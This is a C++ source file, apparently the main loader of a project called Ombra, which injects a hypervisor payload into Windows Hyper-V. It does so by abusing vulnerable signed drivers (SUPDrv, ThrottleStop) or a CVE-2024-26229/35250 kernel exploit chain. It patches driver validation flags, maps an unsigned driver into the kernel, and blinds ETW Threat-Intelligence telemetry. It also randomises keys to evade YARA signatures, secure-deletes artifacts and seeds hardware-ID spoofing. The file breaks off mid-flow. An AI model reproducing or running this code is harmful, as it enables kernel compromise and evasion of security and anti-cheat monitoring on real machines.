// OmbraLoader/main.cpp
// Runtime Hypervisor Injection
//
// Supports two loading methods:
// 1. ZeroHVCI (CVE-based) - Original method, requires unpatched system
// 2. SUPDrv (Signed driver) - Uses VBox/LDPlayer driver, no CVE dependency
//
// Build with USE_SUPDRV to use signed driver loading
// Build with USE_ZEROHVCI to use CVE-based loading (default)
//
// Flow (SUPDrv):
// 1. Pre-flight checks (admin, Hyper-V active)
// 2. Deploy SUPDrv (extract, load via SCM/NtLoadDriver)
// 3. Initialize SUPDrvLoader (version probe, cookie acquisition)
// 4. Allocate kernel memory, load payload, trigger pfnModuleInit
// 5. Payload patches VMExit handler internally
// 6. Driver mapping via VMCALL primitives
//
// Flow (ZeroHVCI):
// 1. Pre-flight checks (admin, Windows version, Hyper-V active)
// 2. ZeroHVCI exploit chain (CVE-2024-26229 or CVE-2024-35250)
// 3. RuntimeHijacker initialization (find hv.exe, VMExit handler)
// 4. Payload injection and VMExit handler patching
// 5. Driver mapping via VMCALL primitives
// 6. VMCALL key setup and callback verification

// Build configuration - define ONE of these
#ifndef USE_SUPDRV
#ifndef USE_ZEROHVCI
#define USE_SUPDRV 1  // Default to SUPDrv (more reliable, no CVE dependency)
#endif
#endif

#include <Windows.h>
#include <string>
#include <intrin.h>
#include <fstream>
#include <vector>

#include "debug.h"

#include <mapper/map_driver.h>
#include <vdm.hpp>
#include <Arch/Pte.h>
#include <identity.hpp>
#include <mapper/kernel_ctx.h>
#include <data.h>
#include <Setup.hpp>

#ifdef USE_SUPDRV
// SUPDrv-based loading headers
#include "supdrv/supdrv_loader.h"
#include "supdrv/driver_deployer.h"
#include "throttlestop/throttlestop_exploit.h"
#endif

#ifdef USE_ZEROHVCI
// ZeroHVCI runtime injection headers
#include "zerohvci/zerohvci.h"
#include "zerohvci/hyperv_hijack.h"
#include "zerohvci/version_detect.h"
#endif

// Phase 3: Artifact Elimination
#include "etw_resolver.h"
#include "prefetch_cleanup.h"
#include <libombra.hpp>

//=============================================================================
// Runtime Key Generation
// Replaces hardcoded VMCALL keys and spoofer seeds with entropy-based values
// Eliminates trivial YARA signatures (0xbabababa, 0x4712abb3892)
//=============================================================================
namespace ombra_keygen {

// Generate runtime VMCALL authentication key using hardware entropy
// Returns a 64-bit key that varies per execution
inline DWORD64 GenerateVmcallKey() {
    // Seed 1: RDTSC (hardware cycle counter - high entropy)
    DWORD64 tsc1 = __rdtsc();

    // Add timing jitter to increase entropy
    volatile int dummy = 0;
    for (int i = 0; i < 100; i++) {
        dummy ^= i;
    }

    // Seed 2: RDTSC after jitter (captures timing variance)
    DWORD64 tsc2 = __rdtsc();

    // Seed 3: Process ID (varies per execution)
    DWORD64 pid = static_cast<DWORD64>(GetCurrentProcessId());

    // Seed 4: Thread ID (additional entropy)
    DWORD64 tid = static_cast<DWORD64>(GetCurrentThreadId());

    // Seed 5: Performance counter (high-resolution timer)
    LARGE_INTEGER perfCount;
    QueryPerformanceCounter(&perfCount);

    // Mix entropy sources using FNV-1a style mixing
    DWORD64 key = 0xcbf29ce484222325ULL;  // FNV-1a offset basis

    key ^= tsc1;
    key *= 0x100000001b3ULL;  // FNV-1a prime
    key ^= tsc2;
    key *= 0x100000001b3ULL;
    key ^= pid;
    key *= 0x100000001b3ULL;
    key ^= tid;
    key *= 0x100000001b3ULL;
    key ^= static_cast<DWORD64>(perfCount.QuadPart);
    key *= 0x100000001b3ULL;

    // Final mixing (Murmur3 finalizer)
    key ^= key >> 33;
    key *= 0xff51afd7ed558ccdULL;
    key ^= key >> 33;
    key *= 0xc4ceb9fe1a85ec53ULL;
    key ^= key >> 33;

    // Ensure non-zero (hypervisor rejects key == 0)
    if (key == 0) {
        key = tsc1 ^ tsc2 ^ 0xDEADBEEFCAFEBABEULL;
    }

    return key;
}

// Generate runtime spoofer seed using hardware entropy
// Returns a 64-bit seed for HWID spoofing operations
inline DWORD64 GenerateSpooferSeed() {
    DWORD64 tsc = __rdtsc();
    DWORD64 pid = static_cast<DWORD64>(GetCurrentProcessId());

    // Mix with golden ratio prime
    DWORD64 seed = tsc ^ (pid << 32);
    seed *= 0x9e3779b97f4a7c15ULL;  // Golden ratio
    seed ^= seed >> 30;
    seed *= 0xbf58476d1ce4e5b9ULL;
    seed ^= seed >> 27;
    seed *= 0x94d049bb133111ebULL;
    seed ^= seed >> 31;

    return seed;
}

} // namespace ombra_keygen

OmbraVdm vdm;

// Command-line flags
static bool g_SkipHyperVCheck = false;

//===----------------------------------------------------------------------===//
// Pre-flight Check Functions
//===----------------------------------------------------------------------===//

bool IsElevated()
{
    BOOL elevated = FALSE;
    HANDLE token = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
    {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size))
        {
            elevated = elevation.TokenIsElevated;
        }
        CloseHandle(token);
    }

    return elevated != FALSE;
}

bool IsIntel()
{
    int id_str[4] = { 0 };
    __cpuid(id_str, 0);

    // CPUID leaf 0 returns vendor string in EBX:EDX:ECX order:
    //   EBX = id_str[1] = "Genu" (0x756e6547)
    //   EDX = id_str[3] = "ineI" (0x49656e69)
    //   ECX = id_str[2] = "ntel" (0x6c65746e)
    // Check ECX for "ntel" to detect Intel
    if (id_str[2] == 0x6c65746e)
        return true;
    return false;
}

bool VerifyHyperVActive()
{
    int info[4] = { 0 };

    // Check CPUID leaf 1 for hypervisor bit (bit 31 of ECX)
    __cpuid(info, 1);
    if (!(info[2] & (1 << 31)))
    {
        DbgLog("[-] No hypervisor detected (CPUID.1.ECX bit 31 not set)");
        return false;
    }

    // Check hypervisor vendor ID (CPUID leaf 0x40000000)
    __cpuid(info, 0x40000000);

    // Decode vendor string for logging
    char vendor[13] = { 0 };
    *(int*)&vendor[0] = info[1];
    *(int*)&vendor[4] = info[2];
    *(int*)&vendor[8] = info[3];
    DbgLog("[*] Hypervisor vendor: %s", vendor);

    // "Microsoft Hv" - EBX = 0x7263694D ('Micr')
    if (info[1] != 0x7263694D)
    {
        if (g_SkipHyperVCheck)
        {
            DbgLog("[!] Non-Microsoft hypervisor detected, but --skip-hyperv-check enabled");
            DbgLog("[!] Continuing anyway (nested virtualization mode)");
            return true;
        }
        DbgLog("[-] Non-Microsoft hypervisor detected");
        DbgLog("    Use --skip-hyperv-check for nested virtualization testing");
        return false;
    }

    return true;
}

std::vector<BYTE> LoadPayloadFile(const char* filename)
{
    std::vector<BYTE> data;

    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    if (file.fail())
    {
        DbgLog("[-] Failed to open payload: %s", filename);
        return data;
    }

    auto fileSize = file.tellg();
    data.resize(static_cast<size_t>(fileSize));

    file.seekg(0, std::ios::beg);
    file.read(reinterpret_cast<char*>(data.data()), fileSize);
    file.close();

    DbgLog("[+] Loaded payload %s (%zu bytes)", filename, data.size());
    return data;
}

// Load PayLoad DLL directly from embedded resource (no disk extraction)
// Automatically selects Intel or AMD based on CPU detection
std::vector<BYTE> LoadPayloadFromResource()
{
    std::vector<BYTE> data;

    // Determine CPU architecture
    bool isIntelCpu = IsIntel();
    const wchar_t* resourceName = isIntelCpu ? L"PAYLOAD_INTEL" : L"PAYLOAD_AMD";
    const char* archName = isIntelCpu ? "Intel" : "AMD";

    DbgLog("[*] Loading %s payload from embedded resource...", archName);

    // Find resource
    HRSRC hRes = FindResourceW(NULL, resourceName, RT_RCDATA);
    if (!hRes)
    {
        DbgLog("[-] LoadPayloadFromResource: FindResourceW failed for %ls (error %lu)",
               resourceName, GetLastError());
        DbgLog("[!] Payload resource not embedded - falling back to file loading");
        return data;  // Return empty, caller can fallback to LoadPayloadFile
    }

    // Load resource
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData)
    {
        DbgLog("[-] LoadPayloadFromResource: LoadResource failed for %ls", resourceName);
        return data;
    }

    // Get pointer and size
    LPVOID pData = LockResource(hData);
    DWORD dwSize = SizeofResource(NULL, hRes);

    if (!pData || dwSize == 0)
    {
        DbgLog("[-] LoadPayloadFromResource: Empty resource data for %ls", resourceName);
        return data;
    }

    // Copy resource data to vector (resource memory is read-only)
    data.resize(dwSize);
    memcpy(data.data(), pData, dwSize);

    DbgLog("[+] Loaded %s payload from resource (%zu bytes)", archName, data.size());
    DbgLog("[+] Resource name: %ls", resourceName);

    return data;
}

// Extract embedded resource to a temp file
// Returns the path to the temp file, or empty string on failure
std::wstring ExtractResourceToTemp(const wchar_t* resourceName, const wchar_t* tempFileName)
{
    // Find resource
    HRSRC hRes = FindResourceW(NULL, resourceName, RT_RCDATA);
    if (!hRes)
    {
        DbgLog("[-] ExtractResource: FindResourceW failed for %ls (error %lu)",
               resourceName, GetLastError());
        return L"";
    }

    // Load resource
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData)
    {
        DbgLog("[-] ExtractResource: LoadResource failed for %ls", resourceName);
        return L"";
    }

    // Get pointer and size
    LPVOID pData = LockResource(hData);
    DWORD dwSize = SizeofResource(NULL, hRes);

    if (!pData || dwSize == 0)
    {
        DbgLog("[-] ExtractResource: Empty resource data for %ls", resourceName);
        return L"";
    }

    DbgLog("[*] ExtractResource: Found %ls (%lu bytes)", resourceName, dwSize);

    // Build temp file path
    wchar_t tempPath[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, tempPath))
    {
        DbgLog("[-] ExtractResource: GetTempPathW failed");
        return L"";
    }

    std::wstring outputPath = tempPath;
    outputPath += tempFileName;

    // Write to temp file
    HANDLE hFile = CreateFileW(
        outputPath.c_str(),
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE)
    {
        DbgLog("[-] ExtractResource: CreateFileW failed for %ls (error %lu)",
               outputPath.c_str(), GetLastError());
        return L"";
    }

    DWORD dwWritten = 0;
    BOOL bResult = WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);

    if (!bResult || dwWritten != dwSize)
    {
        DbgLog("[-] ExtractResource: WriteFile failed (wrote %lu of %lu bytes)",
               dwWritten, dwSize);
        DeleteFileW(outputPath.c_str());
        return L"";
    }

    DbgLog("[+] ExtractResource: Extracted to %ls", outputPath.c_str());
    return outputPath;
}

// Load OmbraDriver.sys directly from embedded resource (no disk extraction)
// Returns driver bytes for direct memory mapping via VMCALL
std::vector<std::uint8_t> LoadDriverFromResource()
{
    std::vector<std::uint8_t> data;
    const wchar_t* resourceName = L"OMBRA_DRIVER";

    DbgLog("[*] Loading OmbraDriver.sys from embedded resource...");

    // Find resource
    HRSRC hRes = FindResourceW(NULL, resourceName, RT_RCDATA);
    if (!hRes)
    {
        DbgLog("[-] LoadDriverFromResource: FindResourceW failed for %ls (error %lu)",
               resourceName, GetLastError());
        DbgLog("[!] Driver resource not embedded - falling back to file loading");
        return data;
    }

    // Load resource
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData)
    {
        DbgLog("[-] LoadDriverFromResource: LoadResource failed for %ls", resourceName);
        return data;
    }

    // Get pointer and size
    LPVOID pData = LockResource(hData);
    DWORD dwSize = SizeofResource(NULL, hRes);

    if (!pData || dwSize == 0)
    {
        DbgLog("[-] LoadDriverFromResource: Empty resource data for %ls", resourceName);
        return data;
    }

    // Copy resource data to vector
    data.resize(dwSize);
    memcpy(data.data(), pData, dwSize);

    DbgLog("[+] Loaded OmbraDriver.sys from resource (%zu bytes)", data.size());
    DbgLog("[+] Driver NEVER touches disk - direct memory mapping");

    return data;
}

//===----------------------------------------------------------------------===//
// Main Entry Point - Runtime Injection Pipeline
//===----------------------------------------------------------------------===//

#ifdef USE_SUPDRV
// SUPDrv-based loading path
int Main()
{
    DbgLog("========================================");
    DbgLog("  Ombra Hypervisor Loader");
    DbgLog("  SUPDrv-Based Injection");
    DbgLog("========================================\n");

    //=== Phase 1: Pre-flight checks ===//
    DbgLog("[*] Phase 1: Pre-flight checks...\n");

    if (!IsElevated())
    {
        DbgLog("[-] FATAL: Must run as Administrator");
        return -1;
    }
    DbgLog("[+] Running with elevated privileges");

    if (!VerifyHyperVActive())
    {
        DbgLog("[-] FATAL: Hyper-V is not active");
        DbgLog("    Ensure Hyper-V is enabled in Windows Features");
        DbgLog("    and virtualization is enabled in BIOS");
        return -1;
    }
    DbgLog("[+] Hyper-V is active\n");

    // Capture timestamp for post-activation ETW wipe
    u64 etw_timestamp_start = ombra::get_etw_timestamp();

    //=== Phase 2: Deploy SUPDrv driver ===//
    DbgLog("[*] Phase 2: Deploying SUPDrv driver...\n");

    supdrv::DriverDeployer deployer;
    bool driverAlreadyLoaded = false;

    // Check if driver is already loaded (LDPlayer running?)
    if (supdrv::DriverDeployer::IsDriverLoaded())
    {
        DbgLog("[+] SUPDrv already loaded (LDPlayer or VBox running)");
        driverAlreadyLoaded = true;
    }
    else
    {
        DbgLog("[*] Deploying driver from resources...");
        if (!deployer.Deploy(supdrv::DeployMethod::Auto))
        {
            DbgLog("[-] FATAL: Driver deployment failed: %s", deployer.GetLastError().c_str());
            return -1;
        }
        DbgLog("[+] Driver deployed via %s",
            deployer.GetDeployMethod() == supdrv::DeployMethod::SCM ? "SCM" : "NtLoadDriver");
        DbgLog("    Path: %ls", deployer.GetDriverPath().c_str());
    }

    //=== Phase 3: Initialize SUPDrv loader ===//
    DbgLog("[*] Phase 3: Initializing SUPDrvLoader...\n");

    supdrv::SUPDrvLoader loader;

    if (driverAlreadyLoaded)
    {
        // Driver was already running - SUPDrvLoader needs to open it fresh
        DbgLog("[*] Driver pre-loaded, SUPDrvLoader will open device...");
        if (!loader.Initialize())
        {
            DbgLog("[-] FATAL: SUPDrvLoader initialization failed: %s", loader.GetLastError().c_str());
            return -1;
        }
    }
    else
    {
        // Transfer the device handle from DriverDeployer to SUPDrvLoader
        // This avoids the issue of opening the device twice which can fail
        HANDLE hDevice = deployer.ReleaseDeviceHandle();
        DbgLog("[*] Transferred device handle from deployer: %p", hDevice);

        if (!loader.Initialize(hDevice, L"\\Device\\Ld9BoxDrv"))
        {
            DbgLog("[-] FATAL: SUPDrvLoader initialization failed: %s", loader.GetLastError().c_str());
            if (hDevice != INVALID_HANDLE_VALUE) {
                CloseHandle(hDevice);  // Clean up the handle we took
            }
            deployer.Cleanup(true);
            return -1;
        }
    }

    DbgLog("[+] SUPDrvLoader initialized");
    DbgLog("    Device: %ls", loader.GetDeviceName());
    DbgLog("    Version: 0x%08X", loader.GetDetectedVersion());
    DbgLog("    Session: 0x%08X / 0x%llX\n",
        loader.GetSessionCookie(), loader.GetSessionPointer());

    //=== Phase 3.5: Bypass -618 check via ThrottleStop ===//
    // supdrvLdrOpen checks two global flags before allowing module loading:
    //   driver_base + 0x4a1a0 = ntoskrnl validation flag
    //   driver_base + 0x4a210 = hal validation flag
    //
    // These flags are set during driver init when it enumerates kernel modules.
    // The enumeration fails in certain environments (the WHY doesn't matter).
    // If either flag is 0, LDR_OPEN returns -618 (VERR_LDR_GENERAL_FAILURE).
    //
    // We use ThrottleStop.sys to get physical memory R/W primitives and
    // write 1 to both flags BEFORE calling LDR_OPEN.
    DbgLog("[*] Phase 3.5: Applying -618 bypass via ThrottleStop...\n");
    {
        // Get Ld9BoxSup.sys base address
        uint64_t driverBase = throttlestop::ThrottleStopExploit::GetDriverBase(L"Ld9BoxSup.sys");
        if (driverBase == 0)
        {
            // Try VBoxDrv if LDPlayer driver not found
            driverBase = throttlestop::ThrottleStopExploit::GetDriverBase(L"VBoxDrv.sys");
        }

        if (driverBase == 0)
        {
            DbgLog("[-] FATAL: Could not find SUPDrv driver base address");
            DbgLog("[-] Ensure Ld9BoxSup.sys is loaded before running the loader");
            loader.Cleanup();
            deployer.Cleanup(true);
            return -1;
        }

        DbgLog("[+] Found SUPDrv driver at: 0x%llX", driverBase);

        // Extract ThrottleStop.sys from embedded resource to temp directory
        DbgLog("[*] Extracting ThrottleStop.sys from embedded resource...");
        std::wstring tsPath = ExtractResourceToTemp(L"THROTTLESTOP_SYS", L"ts_ombra_temp.sys");

        if (tsPath.empty())
        {
            DbgLog("[-] FATAL: Failed to extract embedded ThrottleStop.sys");
            DbgLog("[-] Resource extraction failed - ensure the driver is embedded in OmbraLoader.exe");
            loader.Cleanup();
            deployer.Cleanup(true);
            return -1;
        }

        DbgLog("[+] ThrottleStop.sys extracted to: %ls", tsPath.c_str());

        // Use scoped wrapper for automatic cleanup
        // The destructor will:
        //   1. Close device handle
        //   2. Stop and delete service
        //   3. Secure-delete the temp file (3-pass overwrite)
        throttlestop::ScopedThrottleStop tsExploit(tsPath);
        if (!tsExploit.IsValid())
        {
            DbgLog("[-] FATAL: ThrottleStop initialization failed");
            DbgLog("[-] Error: %s", tsExploit->GetLastErrorMessage().c_str());
            // Clean up temp file manually if init failed
            DeleteFileW(tsPath.c_str());
            loader.Cleanup();
            deployer.Cleanup(true);
            return -1;
        }

        // Patch the -618 flags
        if (!tsExploit->Patch618Flags(driverBase))
        {
            DbgLog("[-] FATAL: -618 bypass failed: %s", tsExploit->GetLastErrorMessage().c_str());
            loader.Cleanup();
            deployer.Cleanup(true);
            return -1;
        }

        DbgLog("[+] -618 bypass SUCCESS - LDR_OPEN will now work!");
        DbgLog("[*] ThrottleStop cleanup will happen automatically...\n");
        // ScopedThrottleStop automatically cleans up:
        //   - Unloads driver
        //   - Deletes service
        //   - Secure-deletes temp file
    }

    //=== Phase 4: Load payload into kernel ===//
    DbgLog("[*] Phase 4: Loading payload into kernel...\n");

    // Try to load from embedded resource first, fallback to file if not found
    std::vector<BYTE> payload = LoadPayloadFromResource();

    if (payload.empty())
    {
        DbgLog("[*] Resource load failed - trying file fallback...");
        const char* payloadName = IsIntel()
            ? "PayLoad-Intel.dll"
            : "PayLoad-AMD.dll";

        payload = LoadPayloadFile(payloadName);
        if (payload.empty())
        {
            DbgLog("[-] FATAL: Failed to load payload (tried resource and file)");
            loader.Cleanup();
            deployer.Cleanup(true);
            return -1;
        }
    }

    // Allocate kernel memory
    void* kernelBase = loader.AllocateKernelMemory(payload.size());
    if (!kernelBase)
    {
        DbgLog("[-] FATAL: Kernel memory allocation failed: %s", loader.GetLastError().c_str());
        loader.Cleanup();
        deployer.Cleanup(true);
        return -1;
    }
    DbgLog("[+] Allocated kernel memory at: %p", kernelBase);

    // Load and execute - pfnModuleInit patches VMExit handler
    // The entry point offset is where OmbraModuleInit is in the payload
    // For a DLL, we need to find the export - for now, assume it's at DLL entry
    if (!loader.LoadAndExecute(kernelBase, payload.data(), payload.size()))
    {
        DbgLog("[-] FATAL: Payload load/execute failed: %s", loader.GetLastError().c_str());
        loader.Cleanup();
        deployer.Cleanup(true);
        return -1;
    }

    DbgLog("[+] HYPERVISOR ACTIVE!");
    DbgLog("    Payload base: %p", kernelBase);
    DbgLog("");

    //=== Phase 5: Setup VMCALL communication ===//
    DbgLog("[*] Phase 5: Setting up VMCALL communication...\n");

    // Generate runtime VMCALL key (replaces hardcoded 0xbabababa)
    DWORD64 VMCALL_KEY = ombra_keygen::GenerateVmcallKey();
    DbgLog("[+] Generated VMCALL key: 0x%llX", VMCALL_KEY);
    ombra::set_vmcall_key(VMCALL_KEY);
    vdm.Init(VMCALL_KEY, 0);

    DWORD64 cr3 = ombra::current_dirbase();
    DbgLog("[+] Guest CR3: 0x%llx", cr3);

    DWORD64 ncr3 = ombra::current_ept_base();
    DbgLog("[+] EPT/NPT base: 0x%llx", ncr3);

    auto identityResult = identity::Init(cr3);
    DbgLog("[+] Identity mapping setup: %d\n", identityResult);

    //=== Phase 6: Map driver if not already mapped ===//
    DbgLog("[*] Phase 6: Checking driver status...\n");

    // Phase 3: Resolve ETW-TI parameters for telemetry blinding
    auto etwParams = etw::ResolveEtwParameters();
    if (etwParams.success) {
        DbgLog("[+] ETW-TI resolved: ntoskrnl=0x%llX offset=0x%llX (build %u)",
            etwParams.ntoskrnl_base, etwParams.offset, etwParams.build_number);
    } else {
        DbgLog("[!] ETW-TI resolution failed (build %u) - continuing without blinding",
            etwParams.build_number);
    }

    DWORD64 callback = ombra::storage_get<DWORD64>(VMX_ROOT_STORAGE::CALLBACK_ADDRESS);
    if (!callback)
    {
        DbgLog("[*] Driver not mapped - mapping OmbraDriver.sys...");

        // Phase 3: Blind ETW-TI during driver mapping
        // This suppresses telemetry events that would expose the mapping operation
        u64 etw_saved_value = 0;
        bool etw_blinded = false;
        if (etwParams.success) {
            auto etwResult = ombra::disable_etw_ti(
                etwParams.ntoskrnl_base, etwParams.offset, etw_saved_value);
            etw_blinded = (etwResult == VMX_ROOT_ERROR::SUCCESS);
            if (etw_blinded) {
                DbgLog("[+] ETW-TI blinded (saved=0x%llX)", etw_saved_value);
            } else {
                DbgLog("[!] ETW-TI blinding failed: %llu", static_cast<u64>(etwResult));
            }
        }

        ULONG64 driverBase = 0;

        USERMODE_INFO uInfo = { 0 };
        if (!setup::InitOffsets(uInfo.offsets))
        {
            DbgLog("[-] FATAL: Could not initialize offsets");
            if (etw_blinded) {
                ombra::enable_etw_ti(etwParams.ntoskrnl_base, etwParams.offset, etw_saved_value);
            }
            loader.Cleanup();
            deployer.Cleanup(true);
            return -1;
        }

        uInfo.loaderProcId = GetCurrentProcessId();
        // Generate runtime spoofer seed (replaces hardcoded 0x4712abb3892)
        uInfo.spooferSeed = ombra_keygen::GenerateSpooferSeed();
        DbgLog("[+] Generated spoofer seed: 0x%llX", uInfo.spooferSeed);
        uInfo.vmcallKey = ombra::VMEXIT_KEY;

        // Try to load driver from embedded resource first (no disk footprint)
        std::vector<std::uint8_t> driverData = LoadDriverFromResource();
        NTSTATUS status;

        if (!driverData.empty())
        {
            // Use vector overload - driver loaded directly from memory
            status = mapper::map_driver(
                driverData,
                0,
                (ULONG64)&uInfo,
                true,
                false,
                &driverBase
            );
        }
        else
        {
            // Fallback to file loading for development/testing
            DbgLog("[*] Falling back to file-based driver loading...");
            status = mapper::map_driver(
                "OmbraDriver.sys",
                0,
                (ULONG64)&uInfo,
                true,
                false,
                &driverBase
            );
        }

        // Restore ETW-TI after mapping completes
        if (etw_blinded) {
            ombra::enable_etw_ti(etwParams.ntoskrnl_base, etwParams.offset, etw_saved_value);
            DbgLog("[+] ETW-TI restored");
        }

        DbgLog("[*] Driver map status: 0x%x", status);

        if (!NT_SUCCESS(status))
        {
            DbgLog("[-] FATAL: Driver mapping failed");
            mapper::kernel_ctx ctx;
            ctx.free_pool((void*)driverBase);
            loader.Cleanup();
            deployer.Cleanup(true);
            return -1;
        }

        DbgLog("[+] OmbraDriver.sys mapped at: 0x%llX", driverBase);
    }
    else
    {
        DbgLog("[+] Driver already mapped (callback: 0x%llX)", callback);
    }

    //=== Phase 6.5: Auto ETW Buffer Wipe ===//
    // Wipe any ETW events generated during loading (before ETW-TI was blinded)
    u64 etw_timestamp_end = ombra::get_etw_timestamp();
    if (etwParams.success) {
        // EtwpLoggerList offset - build-specific, requires PDB or signature scan
        // TODO: Add EtwpLoggerList offset resolution to etw_resolver.h
        constexpr u64 ETWP_LOGGER_LIST_OFFSET_PLACEHOLDER = 0;  // Needs build-specific value

        if (ETWP_LOGGER_LIST_OFFSET_PLACEHOLDER != 0) {
            auto wipeResult = ombra::wipe_etw_buffers(
                etwParams.ntoskrnl_base,
                ETWP_LOGGER_LIST_OFFSET_PLACEHOLDER,
                etw_timestamp_start,
                etw_timestamp_end
            );
            if (wipeResult.success) {
                DbgLog("[+] ETW buffers wiped: %u events from %u buffers",
                    wipeResult.events_wiped, wipeResult.buffers_scanned);
            } else {
                DbgLog("[!] ETW buffer wipe failed");
            }
        } else {
            DbgLog("[!] ETW buffer wipe skipped (EtwpLoggerList offset not configured)");
        }
    }

    //=== Phase 7: Verify callback registration ===//
    DbgLog("\n[*] Phase 7: Verifying callback registration...\n");

    callback = ombra::storage_get<DWORD64>(VMX_ROOT_STORAGE::CALLBACK_ADDRESS);
    DbgLog("[+] Callback address: 0x%llX", callback);

    DWORD64 driverPa = ombra::storage_get<DWORD64>(VMX_ROOT_STORAGE::DRIVER_BASE_PA);
    DbgLog("[+] Driver physical base: 0x%llX", driverPa);

    mapper::kernel_ctx kctx;
    ombra::storage_set(VMX_ROOT_STORAGE::CURRENT_CONTROLLER_PROCESS, kctx.get_peprocess(GetCurrentProcessId()));
    DbgLog("[+] Controller process registered: %p",
        ombra::storage_get<PEPROCESS>(VMX_ROOT_STORAGE::CURRENT_CONTROLLER_PROCESS));

    // Initialize VDM with callback
    vdm.Init(callback);

    // Test callback invocation
    KERNEL_REQUEST req;
    req.instructionID = INST_REGISTER_SCORE_NOTIFY;
    NTSTATUS ntStatus = -1;
    BOOLEAN bSuccess = vdm.CallKernelFunction(&ntStatus, callback, &req);
    DbgLog("[+] Callback test: success=%d status=0x%X", bSuccess, ntStatus);

    //=== Phase 8: Memory operation tests ===//
    DbgLog("\n[*] Phase 8: Memory operation tests...\n");

    DWORD64 value = 0xbeefbeef;
    DWORD64 valueWrite = 0xdeaddead;
    auto writeResult = ombra::write_virt((u64)&value, (u64)&valueWrite, sizeof(valueWrite), cr3);
    DbgLog("[+] Write virtual test: 0x%x", writeResult);
    DbgLog("[+] Value after write: 0x%llX (expected 0xDEADDEAD)", value);

    // Read from identity-mapped physical address
    DbgLog("[+] Physical 0x0: 0x%llX", *(DWORD64*)identity::phyToVirt(0));
    DbgLog("[+] Driver phys read: 0x%llX", *(DWORD64*)identity::phyToVirt(driverPa));

    //=== Complete ===//
    DbgLog("\n========================================");
    DbgLog("  Ombra Hypervisor ACTIVE (SUPDrv)");
    DbgLog("========================================");
    DbgLog("  Payload:    %p", kernelBase);
    DbgLog("  Driver:     0x%llX (phys)", driverPa);
    DbgLog("  Callback:   0x%llX", callback);
    DbgLog("  VMCALL Key: 0x%llX", VMCALL_KEY);
    DbgLog("========================================\n");

    // Note: We don't call deployer.Cleanup() here because the hypervisor needs to stay active
    // Cleanup would unload the driver which would break the hypervisor

    return 0;
}

#else // USE_ZEROHVCI

// ZeroHVCI-based loading path (original CVE-dependent method)
int Main()
{
    DbgLog("========================================");
    DbgLog("  Ombra Hypervisor Loader");
    DbgLog("  Runtime ZeroHVCI Injection");
    DbgLog("========================================\n");

    //=== Phase 1: Pre-flight checks ===//
    DbgLog("[*] Phase 1: Pre-flight checks...\n");

    if (!IsElevated())
    {
        DbgLog("[-] FATAL: Must run as Administrator");
        return -1;
    }
    DbgLog("[+] Running with elevated privileges");

    // Detect and display Windows version
    zerohvci::version::DetectWindowsVersion();
    zerohvci::version::PrintVersionInfo();

    if (!VerifyHyperVActive())
    {
        DbgLog("[-] FATAL: Hyper-V is not active");
        DbgLog("    Ensure Hyper-V is enabled in Windows Features");
        DbgLog("    and virtualization is enabled in BIOS");
        return -1;
    }
    DbgLog("[+] Hyper-V is active\n");

    // Capture timestamp for post-activation ETW wipe
    u64 etw_timestamp_start = ombra::get_etw_timestamp();

    //=== Phase 2: Initialize ZeroHVCI exploit chain ===//
    DbgLog("[*] Phase 2: Initializing exploit chain...\n");

    if (!zerohvci::Initialize())
    {
        DbgLog("[-] FATAL: ZeroHVCI exploit chain failed");
        DbgLog("    System may have April/June 2024 patches installed");
        DbgLog("    (KB5036893, KB5036892, KB5039212, KB5039211)");
        return -1;
    }
    DbgLog("[+] ZeroHVCI initialized - kernel R/W primitives active\n");

    //=== Phase 3: Initialize RuntimeHijacker ===//
    DbgLog("[*] Phase 3: Initializing RuntimeHijacker...\n");

    zerohvci::hyperv::RuntimeHijacker hijacker;
    if (!hijacker.Initialize())
    {
        DbgLog("[-] FATAL: RuntimeHijacker initialization failed");
        zerohvci::Cleanup();
        return -1;
    }

    DbgLog("[+] RuntimeHijacker initialized");
    DbgLog("    CPU: %s", hijacker.IsIntel() ? "Intel (VMX)" : "AMD (SVM)");
    DbgLog("    Hyper-V module at: 0x%llX\n", hijacker.GetHyperVInfo().BaseAddress);

    //=== Phase 4: Load and inject payload ===//
    DbgLog("[*] Phase 4: Loading and injecting payload...\n");

    // Try to load from embedded resource first, fallback to file if not found
    std::vector<BYTE> payload = LoadPayloadFromResource();

    if (payload.empty())
    {
        DbgLog("[*] Resource load failed - trying file fallback...");
        const char* payloadName = hijacker.IsIntel()
            ? "PayLoad-Intel.dll"
            : "PayLoad-AMD.dll";

        payload = LoadPayloadFile(payloadName);
        if (payload.empty())
        {
            DbgLog("[-] FATAL: Failed to load payload (tried resource and file)");
            zerohvci::Cleanup();
            return -1;
        }
    }

    if (!hijacker.HijackHyperV(payload.data(), payload.size()))
    {
        DbgLog("[-] FATAL: Hyper-V hijack failed");
        zerohvci::Cleanup();
        return -1;
    }

    DbgLog("[+] HYPERVISOR ACTIVE!");
    DbgLog("    Payload base: 0x%llX", hijacker.GetPayloadBase());
    if (hijacker.UsesTrampoline())
    {
        DbgLog("    Trampoline at: 0x%llX", hijacker.GetTrampolineAddr());
    }
    DbgLog("");

    //=== Phase 5: Setup VMCALL communication ===//
    DbgLog("[*] Phase 5: Setting up VMCALL communication...\n");

    // Generate runtime VMCALL key (replaces hardcoded 0xbabababa)
    DWORD64 VMCALL_KEY = ombra_keygen::GenerateVmcallKey();
    DbgLog("[+] Generated VMCALL key: 0x%llX", VMCALL_KEY);
    ombra::set_vmcall_key(VMCALL_KEY);
    vdm.Init(VMCALL_KEY, 0);

    DWORD64 cr3 = ombra::current_dirbase();
    DbgLog("[+] Guest CR3: 0x%llx", cr3);

    DWORD64 ncr3 = ombra::current_ept_base();
    DbgLog("[+] EPT/NPT base: 0x%llx", ncr3);

    auto identityResult = identity::Init(cr3);
    DbgLog("[+] Identity mapping setup: %d\n", identityResult);

    //=== Phase 6: Map driver if not already mapped ===//
